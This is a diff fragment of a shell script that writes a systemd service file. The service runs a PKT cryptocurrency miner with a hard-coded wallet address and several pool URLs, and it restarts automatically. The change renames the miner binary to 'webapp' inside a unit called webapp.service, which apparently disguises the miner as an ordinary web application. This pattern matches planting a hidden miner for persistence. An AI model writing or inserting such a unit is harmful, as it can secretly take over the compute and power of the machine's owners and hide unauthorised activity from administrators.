@@ -9,7 +9,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+ExecStart= /home/webapp ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
 WatchdogSec=36000
 Restart=always
 RestartSec=60
